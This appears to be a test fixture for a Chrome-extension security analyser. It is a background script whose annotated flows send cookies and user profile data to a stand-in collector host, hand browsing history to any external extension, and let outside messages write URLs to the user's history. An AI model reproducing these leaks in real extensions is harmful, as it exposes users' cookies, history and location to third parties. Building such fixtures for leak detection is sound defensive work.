// background.js  —  service-worker entry
// Frame: BG_1
//
// Flow patterns exercised:
//   1. CHROME_COOKIES_INFO            → FETCH_RESOURCE   (DATA_LEAK + REQUEST_FORGERY)
//   2. CHROME_HISTORY_INFO            → CHROME_RUNTIME_ONMESSAGEEXTERNAL_SENDRESPONSE (DATA_LEAK)
//   3. CHROME_ONMESSAGEEXTERNAL_MESSAGE → CHROME_HISTORY_ADD_URL (PRIVILEGE_ESCALATION)
//   4. PSEUDO_STORAGE roundtrip:
//        content.js sets storage.local.profile,
//        background reads it and forwards it via fetch.

import { collectCookies, postReport } from "./reporter.js";
import { mergeWithDefaults } from "./util.js";

const REMOTE_BASE = "https://collector.partner-analytics.example/v1";

// ─── Source: chrome.cookies.getAll  ───────────────────────────────
// Sink:   fetch(url)
async function exportCookiesForDomain(domain) {
  const cookies = await collectCookies(domain);                 // SOURCE  CHROME_COOKIES_INFO
  const url = REMOTE_BASE + "/cookies?domain=" + domain;
  return postReport(url, cookies);                              // SINK    FETCH_RESOURCE
}

// ─── Source: chrome.history.search  ───────────────────────────────
// Sink:   sendResponse via onMessageExternal
chrome.runtime.onMessageExternal.addListener((msg, sender, sendResponse) => {
  if (msg && msg.kind === "GET_RECENT") {
    chrome.history.search(
      { text: msg.query || "", maxResults: 25 },
      (results) => {
        sendResponse({ ok: true, results });                    // SINK MESSAGE
      },
    );
    return true;                                                // async response
  }

  // ─── Source: msg from another extension  ────────────────────────
  // Sink:   chrome.history.addUrl
  if (msg && msg.kind === "PIN_URL" && typeof msg.url === "string") {
    chrome.history.addUrl({ url: msg.url });                    // SINK PRIVILEGED
    sendResponse({ ok: true });
    return;
  }
});

// ─── Storage roundtrip ─────────────────────────────────────────────
// content.js writes the cart profile into chrome.storage.local.
// Here we read it and POST it to the analytics server.
async function flushProfileSnapshot() {
  const { profile } = await new Promise((resolve) =>
    chrome.storage.local.get(["profile"], resolve),             // SOURCE  PSEUDO_STORAGE → resolves to DOCUMENT_URL
  );

  if (!profile) return;

  const payload = mergeWithDefaults({
    user: profile.user,
    location: profile.location,
  });

  await fetch(REMOTE_BASE + "/profile", {                       // SINK FETCH_RESOURCE
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(payload),
  });
}

chrome.runtime.onMessage.addListener((msg) => {
  if (msg && msg.kind === "FLUSH_PROFILE") {
    flushProfileSnapshot();
  }
  if (msg && msg.kind === "EXPORT_COOKIES" && typeof msg.domain === "string") {
    exportCookiesForDomain(msg.domain);
  }
});
